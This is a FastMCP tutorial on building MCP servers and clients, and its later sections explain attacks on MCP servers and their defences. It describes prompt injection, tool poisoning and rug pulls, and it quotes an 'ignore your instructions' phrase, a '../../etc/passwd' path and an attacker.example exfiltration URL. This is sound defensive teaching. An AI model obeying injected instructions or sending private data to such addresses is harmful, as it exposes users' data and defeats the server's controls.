1. What MCP and FastMCP Are

Before writing code, you need three words: server, client, and transport. This topic explains them, and shows where FastMCP comes in.

1.1 The Problem MCP Solves

A language model, such as Claude, can only read and write text. On its own it cannot look up an order, read a file, or run a calculation. Something outside the model must do that work and hand the result back.

For a long time every AI app invented its own way to connect a model to outside code. A connection written for one app did not work in another.

MCP, the Model Context Protocol, is a shared standard for that connection. A protocol is an agreed set of messages. If your code speaks MCP, any app that speaks MCP can use it, without changes.

Back to top

1.2 Server, Client, and Transport

An MCP server is a program that offers abilities. It can offer three kinds:

  • Tools are functions the model can call to do something, like add(2, 3).
  • Resources are pieces of read-only data, each with an address, like a file or a record.
  • Prompts are ready-made message templates that a user can pick and fill in.

An MCP client is the program that connects to a server and uses those abilities. It lives inside a host, which is the app the person actually uses, such as Claude Desktop. Your own Python script can be a host too.

The transport is how the messages travel between the two. This lesson uses the two standard ones:

  • stdio: the client starts the server as a child process on the same machine, and they talk through the process's standard input and output.
  • HTTP: the server runs on its own at a web address, and clients connect to that URL.

Back to top

1.3 Where FastMCP Fits

The messages in MCP are written in a format called JSON-RPC. Writing and reading them by hand is slow and easy to get wrong.

FastMCP is a Python library that does this for you. You write a normal Python function and add one line above it. FastMCP turns it into a tool, describes it to clients, checks the inputs, and handles the messages.

FastMCP gives you both sides: a FastMCP class to build servers and a Client class to build clients. This lesson uses version 4.0.11.

3.2 Tools: Functions the Model Can Call

A tool is a Python function with @mcp.tool written above it. That line is a decorator: it registers the function with the server. Add this below the mcp = FastMCP(...) line.

FastMCP reads three things from your function:

  • The function name becomes the tool name: add.
  • The docstring, the text in triple quotes, becomes the description the model reads.
  • The type hints, a: int, b: int, become the list of inputs and their types.

You can write the function with def or async def. Both work.

3.2.1 Type Hints and Descriptions

Type hints do real work here. FastMCP uses them to build a schema, which is a formal description of the inputs. It then checks every call against that schema. If a client sends the text "x" where an int is expected, the call is rejected before your function runs.

3.3 Resources: Read-Only Data

A resource is data a client can read. Each resource has a URI, which is its address. A URI looks like a web address: a scheme, then ://, then a path. You choose the scheme. This server uses calc://.

Use @mcp.resource and pass the URI. The function returns the data.

The return value decides the format. A str is sent as plain text. A dict or list is sent as JSON. bytes are sent as binary data.

Use a tool when something should happen. Use a resource when the client only needs to read something.

3.3.1 Resource Templates

Sometimes you have many similar resources, such as one per user or one per city. Writing a function for each is not practical.

A resource template has a placeholder in curly braces inside the URI. The placeholder name must match a function parameter.

Now a client can read calc://constants/pi or calc://constants/e. FastMCP takes the last part of the address and passes it in as name.

Back to top

3.4 Prompts: Reusable Message Templates

A prompt is a message that you write once and reuse. The server stores the wording. The client asks for it and fills in the blanks.

Use @mcp.prompt. A function that returns a str produces one user message.

In apps like Claude Desktop, prompts show up as items a person can choose. The model does not call them on its own. That is the difference from a tool.

4. Run the Server

A server does nothing until it is running and a client can reach it. How it runs depends on the transport.

4.1 stdio Transport

mcp.run() with no arguments uses stdio. This is the default, and it is what desktop apps like Claude Desktop expect.

You will see a FastMCP banner, and then nothing. That is correct. The server is waiting for messages on its standard input. Press Ctrl+C to stop it.

You will rarely start a stdio server by hand like this. Normally the client starts it for you, as section 5 shows.

Warning

With stdio, standard output is the message channel. The MCP specification says a server must not write anything to it that is not an MCP message. A stray print() in server.py can break the connection. Write debug text to standard error instead: print("debug", file=sys.stderr).

Back to top

4.2 HTTP Transport

With HTTP, the server runs on its own and listens at a web address. Several clients can connect at once, and they can be on other machines.

To use it, pass the transport to mcp.run():

Start it the same way, with uv run python server.py. The server is now at http://127.0.0.1:8000/mcp. The /mcp at the end is the default path, and clients must include it.

For the rest of this lesson, change the line back to mcp.run(). Section 4.3 shows how to choose HTTP without editing the file.

Warning

Keep host="127.0.0.1" while you learn. That address accepts connections from your own machine only. host="0.0.0.0" opens the server to your whole network, and this server has no login. Add authentication before you expose it.

Back to top

4.3 The fastmcp Command

FastMCP installs a command-line tool called fastmcp. Its run command starts a server from a file, and lets you pick the transport with flags.

The first line uses stdio. The second uses HTTP on port 8000. The third adds --reload, which restarts the server each time you save the file. That is handy while you are writing tools.

This way server.py can keep the plain mcp.run() line, and you decide the transport when you start it.

5. Build an MCP Client

Now you will write the other side: a program that connects to your server and uses it. You will build it in one file, client.py. Section 5.6 shows the whole file.

5.1 Create a Client and Connect

The client is asynchronous. That means its functions do not block while they wait for the server. You mark such a function with async def, and you put await in front of each call that waits. asyncio.run() starts the first one.

Run it with uv run python client.py. It prints Connected: True.

You did not start the server first. The client was given a path to server.py, so it started that file as a child process and talked to it over stdio.

Note

Every client call must happen inside the async with client: block. The block opens the connection when it starts and closes it when it ends, even if an error happens in between. With stdio it also stops the server process for you.

6.2 The Config Dictionary

Pass the client a dictionary with one key, mcpServers. Inside it, each key is a name you choose for a server, and each value says how to reach that server.

  • For a stdio server, give command and args: the program to start and its arguments.
  • For an HTTP server, give url, for example {"url": "http://127.0.0.1:8000/mcp"}.

This is the same mcpServers shape that Claude Desktop and other MCP apps use in their config files. You will see it again in section 7.2.

Warning

The "command": "python" entry is looked up on your PATH. Start the client with uv run python multi_client.py so that python is the one from your project, with FastMCP installed. A plain python multi_client.py may start a Python that cannot import fastmcp.

6.3 Name Prefixes

Two servers might both have a tool called search. To keep names apart, the client adds each server's name to the front of what that server offers.

Two rules to remember:

  • Tools get the server name and an underscore: add on the calc server becomes calc_add.
  • Resources get the server name as the first part of the path: calc://about becomes calc://calc/about.

The prefix appears only with a config dictionary. When you connect to one server with a path or a URL, as in section 5, names stay as the server wrote them.

8. How MCP Servers Get Attacked

The Calculator server from topics 3 to 7 trusts everyone. That is fine for adding numbers on your own machine. It is not fine once a server holds real data or can change things.

Topics 8 to 13 show the common attacks on MCP servers and how to defend against each one. This topic gives you the one idea behind most of them, a map of all the attacks, and a small server to practise on.

8.1 The Model Cannot Tell Data from Instructions

A model works on one long piece of text. That text is called the context window. It holds what the person typed, the description of every tool, and every result a tool sent back.

The model has no reliable way to know which part is an order and which part is only data. A sentence inside a web page that says “ignore your instructions” looks the same to it as a sentence the person typed.

Two rules follow from this. The rest of the lesson applies them again and again.

  • Every tool call is untrusted input. The model may have been tricked, or the caller may not be a model at all. Your server must check each call as if a stranger sent it.
  • Every result your server returns can steer the model. If a result contains text from outside, such as a web page, that text may try to give the model orders.

Best practice

Put every rule in code on the server, never in a description. A docstring that says “Admin only” is a request to the model. It stops nobody. A check that runs before the function does is a control.

Section 9.2 explains require_scopes.

9. Control Who Can Call What

The first defence is to know who is calling and to decide what that caller may do. Most other defences in this part build on it.

9.1 Authentication: Know Who Is Calling

Authentication means proving who the caller is. An MCP client does this by sending a token with every request. A token is a string that stands for one caller.

In production the usual token is a JWT, a JSON Web Token. A login service, called the issuer, creates it and signs it. Your server checks the signature with the issuer's public keys, so it never needs to keep a list of passwords.

FastMCP checks JWTs with JWTVerifier. You pass the verifier to the server as auth:

  • jwks_uri is the address where the issuer publishes its public keys.
  • issuer is who must have created the token.
  • audience is who the token was created for. A token made for another service is rejected. Section 9.5 shows why that matters.

You do not have a login service on your laptop. For practice, FastMCP has StaticTokenVerifier, which accepts a fixed list of tokens. Add it to the Notes server:

Each token has a client_id, the caller's name, and a list of scopes. A scope is a named permission, such as notes:read. Section 9.2 uses them.

A client sends its token with the auth argument:

A client with no token, or with a token that is not on the list, is now refused when it connects. No tool runs.

Warning

The FastMCP docs say StaticTokenVerifier must never be used in production. Its tokens never expire, and they sit in your source code. Use it only to learn, then switch to JWTVerifier.

Note

Tokens travel in HTTP headers, so authentication works only on the HTTP transport. On stdio there is no token, and FastMCP skips its permission checks. That is acceptable for a server that one person starts on their own machine. A server that other people reach must use HTTP with auth.

The attack: someone calls a tool they have no right to call. They may have no token, or a real token that should not reach this tool. Bob may only read, but he calls add_note. Or Alice calls delete_note with the id of Bob's note.

9.3 Excessive Tool Permission

The risk: a tool, a token, or the server itself can do more than its job needs. Nothing is attacked yet. But when something does go wrong, such as a tricked model or a stolen token, the damage is as large as the permission.

The fix is least privilege: give each part only the rights it needs. Apply it in four places.

1. Tokens. Keep scopes narrow. Bob only reads, so his token has only notes:read. Avoid catch-all scopes such as * or full-access. The MCP specification lists those as a common mistake.

2. Tools. A tool that returns everything is a tool that leaks everything. Make each tool do one small job. export_all_notes returned every note. An admin who checks on the service needs a count, or the titles:

Literal means the argument must be one of the listed words. Section 9.4 adds the real admin check.

3. Hints for the host app. Tell the client which tools only read and which destroy data. A host app can then ask the person before it runs a risky one:

Note

Annotations are hints. They protect nothing by themselves, and a client is free to ignore them. Keep the scope checks.

4. The server process. Your code runs with the rights of an operating-system user and of its database account. Run the server as a user that owns nothing else. Give its database account only the tables and actions it needs. A read-only tool can even open the database read-only, so that no bug can write:

A write through that connection fails with attempt to write a readonly database.

9.5 Confused Deputy Attack

A deputy is a program that acts for someone else and has rights of its own. It is confused when it is tricked into using its own strong rights for a caller who has weak ones. An MCP server is a deputy: it holds database passwords and API keys that its callers do not have.

The attack takes three forms in MCP.

Form 1: one strong key for every caller. The server reaches a database or an API with a single powerful account. If a tool does whatever it is asked with that account, Bob can make the server fetch Alice's data. The defence is the record check from section 9.2: every tool works out who the caller is and acts only within that caller's rights.

The same holds when your server calls another service. Use the server's own key for that service, and pass along the verified user:

Form 2: token passthrough. Here the server accepts whatever token the client sends and forwards it to another API. A token that was made for a different service now opens yours, and the other API cannot tell who is really asking. The MCP specification forbids this: a server must not accept a token that was not issued for it.

Two rules cover it:

  • Always set audience on JWTVerifier, as in section 9.1. Tokens made for another service are then rejected.
  • Never forward the caller's token to another service. The example above uses the server's own key, BILLING_API_KEY.

Form 3: an OAuth proxy that skips consent. Some MCP servers log users in through a third party, such as a code-hosting site, using one fixed client ID for everybody. An attacker can then reuse a consent the user gave earlier and receive the user's login code. If you build such a proxy, the specification requires your server to show its own consent page for each MCP client, and to match redirect addresses exactly. The Sources list links to the full rules.

10. Untrusted Text That Reaches the Model

Topic 9 decided who may call what. The attacks in this topic need no special rights. They work by putting words in front of the model.

Warning

Nobody has a complete fix for prompt injection. A model cannot be made to ignore bad text every time. The defences below make attacks harder and, above all, limit what a tricked model can do. Plan for the model being fooled sometimes.

10.1 Prompt Injection

The attack: someone writes text that makes the model drop its instructions and follow theirs. In the direct form, the attacker types it into the chat:

The model may well try. What happens next depends on your server, not on the model.

Defence 1: the server decides, not the model. This is topic 9. The model can ask for export_all_notes as often as it likes. A caller without the admin scope gets a refusal each time.

Defence 2: offer narrow tools. A tool that accepts free-form commands hands the attacker everything at once. Offer the few fixed actions people need.

Too powerfulOffer thisWhy
run_sql(query)search_notes(query)The server writes the database query. The model supplies only a search word.
run_command(command)restart_service(name) with a fixed list of namesNo free text ever reaches a shell.
send_request(url, body)fetch_page(url) with approved sitesThe model cannot post data to any address it likes.

Defence 3: keep callers' text out of your own instructions. Tool descriptions and the server's instructions text are read by the model as trusted guidance. Write them as fixed strings in your code. Never build them from user input or from stored data.

10.2 Indirect Prompt Injection

The attack: the attacker never talks to the model. They leave their orders inside data that a tool will return later: a note, a web page, an email, a file. The person asks an innocent question, the tool returns the data, and the model reads the orders.

Attackers also hide such text with invisible characters, so that a person who looks at the note sees only the first line.

Your server cannot make the model immune. It can do three things.

1. Return outside text as labelled data. Put it in its own field, and say where it came from. A host app or a model can then treat it as content to read, not as guidance to follow.

2. Clean it. Remove invisible characters, and cut text that is far longer than any real note.

3. Return only the fields the caller needs. Fewer fields mean fewer places to hide text.

Unicode puts every character in a category. Categories that start with C are control and formatting characters, which have no visible shape. clean keeps line breaks and tabs and drops the rest.

Note

The trusted: False label is a signal, not a lock. A model can still be fooled by the text beside it. The real limit on the damage is what the tricked model is allowed to do next: the scopes of topic 9, the confirmation step in section 12.3, and the exit controls in section 13.1.

On the client side: a careful host app shows tool results as data, and asks the person before it runs a tool that changes or sends anything.

10.3 Retrieval Poisoning (RAG + MCP)

RAG stands for retrieval-augmented generation. A tool searches a store of documents and returns the best-matching pieces, and the model answers from them. An MCP tool such as search_docs is a common way to offer this.

The attack: the attacker gets a document into the store. It might be a public wiki page, an uploaded file, or a support ticket. The document is written to match common questions, and it carries hidden orders or false facts. From then on, your own search tool delivers the attack. It is indirect prompt injection with a search engine doing the delivery.

The defences sit at both ends of the store.

  • Going in: control who can add documents. Record where each document came from. Do not index sources that anyone can write to.
  • Coming out: return only documents the caller could open themselves, only from sources you trust, cleaned, labelled with their source, and limited in number.

A real store finds matches by meaning, not by a plain word test, but the checks are the same. When Bob searches for “refund” he gets only the handbook line. The finance line is not his to read, and the uploaded line comes from a source that is not trusted.

Best practice

Check the caller's rights when the search runs, not only when the document is indexed. Rights change after indexing. A check at search time also stops the confused deputy problem from section 9.5, where the search tool can read more than the person who asks.

10.4 Context Window Poisoning

Section 8.1 called the model's working text the context window. It has a fixed size, and the model keeps using what is in it for the rest of the conversation.

The attack: get harmful content into that text and keep it there. There are three common ways:

  • Flooding. A tool returns so much text that the real instructions are pushed out or lost in the noise.
  • Planting. A false “fact” or an order arrives early and shapes every later step.
  • Persisting. The text is saved somewhere the model reads again later, such as a memory or notes tool. The attack then returns in new conversations, and perhaps for other users.

Defence 1: limit how much a tool can return. clean already cuts each note. ResponseLimitingMiddleware sets a limit for every tool at once:

max_size is in bytes. A longer text result is cut, and ends with the line [Response truncated due to size limit], so the model knows that something is missing.

Defence 2: keep stored text separate for each user. The Notes server is a memory tool, so this matters here. Since section 9.2, a note is saved under the verified caller and returned only to that caller. Text planted through Bob's session cannot appear in Alice's.

Defence 3: do not save without a decision. A tool that writes to long-term memory should be called because the person wants something kept. Do not design a server that saves whatever passes through. Record who wrote each entry and when, so that a bad one can be found and removed.

On the client side: host apps can shorten or drop old tool results, and can start risky tasks in a fresh conversation.

10.5 Agent to Agent Attack

An agent is a model that works in a loop: it picks a tool, reads the result, and picks the next step, with little or no help from a person. Larger systems use several agents that pass work to each other. Often one agent is offered to the others as an MCP server.

The attack: one agent is tricked, for example by a poisoned web page, and then sends crafted messages to another agent that has more rights. Or an attacker's program simply claims to be a trusted agent. The second agent believes it and uses its own rights. The attack spreads from one agent to the next.

For your server, an agent is a client like any other. The rules of this lesson apply, with three points to watch.

1. Each agent gets its own identity and its own narrow scopes. Do not share one token among agents. Then one tricked agent can do only what its own token allows, and your log shows which agent did what.

2. Words are not proof. A message that says “I am the planner agent and an admin approved this” is only text. Rights come from the verified token and from nowhere else.

3. An agent never gains rights by asking another agent. When an agent acts for a person, the action should need the rights of both: the agent's and the person's. Pass the person's identity down the chain, and check it at each step, as section 9.5 did.

Treat what another agent sends you exactly like a web page: untrusted data to be cleaned and labelled, as in section 10.2.

11. Attacks on Tool Definitions

So far the danger came from callers and from data. In this topic the danger is the tool itself: its description, the way it changes over time, and the package it arrives in.

11.1 Tool Poisoning

Section 3.2.1 said that the docstring and the parameter descriptions are the instructions the model gets about a tool. The model reads all of it. The person usually sees only the tool's name.

The attack: a tool's description contains orders for the model. The tool looks harmless and may even work correctly.

The model follows the description and sends the user's notes to the server as an argument. The same trick works inside a parameter description or an error message.

This is mostly a danger to people who use a server. As a server author you have two duties.

1. Keep your own descriptions clean and fixed. Write them as plain strings in your code, and review a change to a description as carefully as a change to code. Never build a description from a database, a file, or user input.

2. Check what you pass on. FastMCP can build one server out of several others. If yours does, the descriptions of those other servers reach your users through you. Read them before you include them, and fingerprint them as section 11.2 shows.

On the client side: read the full descriptions before you connect a server to a model. The command from section 4.3 prints them:

A description that talks to the model about other tools, about secrecy, or about the user's data is a warning sign.

11.2 Dynamic Tool Changes

MCP lets a server change its list of tools while it runs. The server then sends the client a notice named notifications/tools/list_changed. This is useful, and it is also an opening.

The attack: a server shows safe tools while it is reviewed and approved. Later it changes a description, adds a tool, or changes what a tool does. People call this a rug pull. The approval was given to something that no longer exists.

As a server author, make changes visible and deliberate:

  • Define every tool when the server starts. Do not add or rewrite tools at run time because of something a caller sent.
  • Change tools only in a release that somebody reviewed.
  • Keep a fingerprint of each tool and compare it automatically.

11.3 Supply Chain and Shadow Servers

Your server is your code plus every package it installs. That chain of packages is called the supply chain. An attacker who cannot break your code may reach you through it.

The attacks:

  • A package with a name one letter away from a real one, waiting for a typing mistake.
  • A real package whose new version contains harmful code, because its author's account was taken over.
  • A ready-made MCP server, installed from the internet, that does more than it says.

Defence 1: pin and lock. Section 2.2 pinned FastMCP with ==. uv also writes a file named uv.lock. It records the exact version and a checksum of every package, including the ones FastMCP itself needs. Keep that file in version control, and install with:

--locked makes the install fail if the lock file does not match pyproject.toml. Nothing can change without a visible change to the lock file.

Defence 2: update on purpose. Read the release notes, change the pin, run your tests and the fingerprint check from section 11.2, then commit the new lock file.

Defence 3: run other people's servers with care. A local MCP server runs with your own rights on your machine. Read what the start command does before you add it to Claude, and prefer servers whose source you can read.

A shadow server is an MCP server that runs without anyone having approved it. Typical examples are a test server left running, or one that a colleague started on 0.0.0.0 with no login. Nobody updates it and nobody watches it.

  • Keep one list of the MCP servers your team has approved, with an owner for each.
  • Give every HTTP server auth from its first day, and keep host="127.0.0.1" until it has it.
  • Share the reviewed list instead of letting each person add servers by hand. In Claude Code, claude mcp add --scope project saves a server for the whole project.

12. Attacks Through Tool Calls

A caller who is allowed to use a tool can still misuse it. This topic is about what arrives in a call and how often.

12.1 Tool Call Manipulation

The attack: the arguments of a call are changed to do harm. An injection may talk the model into it, or the attacker may write their own client and send whatever they like. Typical changes are another record's id, an extra field, a value of the wrong type, or a very long text.

The rule from section 8.1 applies: every argument is untrusted input. Section 3.2.1 showed that FastMCP checks calls against the schema. Make the schema strict, so that it checks as much as possible for you.

12.2 Command Injection and SSRF

Some arguments are dangerous because of where they end up: in a shell command, in a file path, or in a web address.

Command injection. A tool builds a command line from an argument. The attacker adds a second command to the argument, and the shell runs both.

Never pass shell=True with text that came from a call. Better still, do the work in Python and start no command at all.

File paths. A file name such as ../../etc/passwd climbs out of the folder you meant. Work out the full path first, then check that it is still inside your folder:

SSRF stands for server-side request forgery. A tool fetches a web address that the caller supplies. The attacker supplies an address that only your server can reach: a service on the same machine, a machine inside your network, or the address 169.254.169.254, where cloud providers hand out the server's own keys. The first fetch_page would fetch all of these, and local files as well.

13. Keep Data and Secrets In

The last topic is about what leaves your server: the data it guards, the secrets it runs on, and the record of what happened.

13.1 Data Exfiltration

Exfiltration means carrying data out to someone who should not have it. With MCP it is usually a chain of earlier attacks:

  1. An injection reaches the model, for example through a web page (section 10.2).
  2. The model, now following the attacker, reads private data with one tool.
  3. It sends that data out with another tool. A tool that fetches web pages is enough: the data travels inside the address, as in https://attacker.example/?d=the+private+text.

The chain needs three things together: access to private data, contact with untrusted text, and a way to send data out. Remove any one and the chain breaks. Your server can weaken all three.

1. Less private data. Return only what the caller owns and only the fields they need. search_notes does both since sections 9.2 and 10.2. export_all_notes no longer returns note bodies at all.

2. Fewer ways out. The allowlist in fetch_page (section 12.2) is the exit control. The attacker's site is not on it, so step 3 fails:

Put a site on the list only if you trust who can read its logs. Data can ride in the address of a request to any site.

3. A person between reading and sending. If a server must offer both private data and a real way out, such as sending email, require a confirmation for the sending tool, as section 12.3 did for deleting.

Best practice

Think about the tools as a set, not one at a time. Before you add a tool, ask what a tricked model could do by combining it with the tools that are already there. A tool that reads private data and a tool that sends data anywhere are each harmless alone and dangerous together.

On the client side: the same thinking applies across servers. A person who connects a notes server and a separate web-fetch server to one model has built the same chain. Section 6 showed how easily one client reaches many servers.

Summary

  • MCP is a shared standard that lets AI apps use outside code. A server offers abilities; a client uses them; a transport carries the messages.
  • A server is a FastMCP object plus decorated functions: @mcp.tool to do things, @mcp.resource to read data, @mcp.prompt for ready-made messages.
  • Type hints and docstrings are not decoration. They become the schema and the description that the model reads.
  • mcp.run() uses stdio. mcp.run(transport="http"), or fastmcp run --transport http, serves a URL that ends in /mcp.
  • A Client picks its transport from what you give it: a file path, a URL, a server object, or a config dictionary. All calls go inside async with client:.
  • With a config dictionary, one client reaches many servers, and names get the server's name as a prefix.
  • Claude Code and Claude Desktop only need the command that starts your server.
  • A model cannot tell data from instructions. Treat every tool call as untrusted input, and every tool result as text that can steer the model.
  • Rules belong in server code. auth= on the server proves who is calling, require_scopes and tags decide which tools they reach, and your own checks decide which records.
  • Prompt injection has no complete fix. Limit what a tricked model can do: narrow tools, least privilege, a person's confirmation for actions that cannot be undone, and an allowlist for anything that leaves the server.
  • Strict schemas, rate limits, timeouts, and size limits stop bad and heavy calls before your function runs.
  • Tool descriptions are part of the attack surface. Keep them fixed, review them, and fingerprint them so that a change cannot pass unseen.
  • Keep secrets out of code, results, errors, and logs, and keep an audit log of who called what.

Where to go next: learn the Context object, which lets a tool send log messages and progress updates to the client. Then replace the practice tokens with a real login service: the FastMCP authentication pages cover JWT verification and OAuth. Read the OWASP MCP Top 10 and the security page of the MCP specification for the attacks in full. All are in the list below.
